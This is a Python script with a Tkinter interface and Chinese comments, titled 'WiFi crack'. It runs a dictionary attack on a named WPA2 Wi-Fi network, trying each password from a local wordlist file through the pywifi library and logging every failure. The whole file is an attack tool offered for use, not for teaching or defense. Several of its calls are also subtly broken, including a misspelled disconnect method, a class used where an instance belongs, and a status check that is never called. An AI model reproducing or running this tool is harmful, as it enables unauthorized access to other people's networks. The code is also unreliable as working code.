from tkinter import *
from pywifi import const
import pywifi
import time


# 读取密码
def readPwd():
    # 获取输入的WiFi名称
    wifiName = entry.get()
    # 字典路径
    path = r'D:\project\pathon\text.txt'
    file = open(path, 'r')
    while True:
        try:
            # 读取一行
            myStr = file.readline()
            if len(myStr) == 0:
                print(myStr)
                break
            else:
                # 测试连接
                bool = wificonnect(myStr,wifiName)
                # bool = True
                if bool:
                    print('密码正确',myStr)
                    break
                else:
                    # print('密码错误',myStr)
                    text.insert(END,'密码错误：'+myStr)
                    text.see(END)
                    text.update()
        except:
            continue
# 测试连接
def wificonnect(str,wifiName):
    # 创建一个无线对象
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有WiFi
    ifaces.disconnnect()
    time.sleep(1)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile
        profile.ssid = wifiName
        # WiFi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # wifi密码
        profile.key = str
        # 网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # 删除所有的WiFi连接文件
        ifaces.remove_all_network_profile()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(5)
        if ifaces.status == const.IFACE_CONNECTED:
            return True
        else:
            return False
    if ifaces.status() == const.IFACE_CONNECTED:
        print('已经连接')


# 创建窗口
root = Tk()
# 窗口的标题
root.title('WiFi破解')
# 窗口的大小
# root.geometry('500x400')
# 窗口的位置
# root.geometry('+550+260')
# 合并窗口的大小与位置
root.geometry('500x400+850+360')
# 标签控件
label = Label(root, text='输入要破解的WiFi名称：')
# 标签的位置 定位
label.grid(row=0, column=0)  # 默认的位置 row = 0,column = 0
# 输入控件
entry = Entry(root, font=('微软雅黑', 20))
entry.grid(row=0, column=1)
# 列表框控件
text = Listbox(root, font=('微软雅黑', 15), width=40, height=10)
text.grid(row=1, columnspan=2)
# button
button = Button(root, text='开始破解', width=20, height=2, command=readPwd)
button.grid(row=2, columnspan=2)
# 显示窗口
root.mainloop()

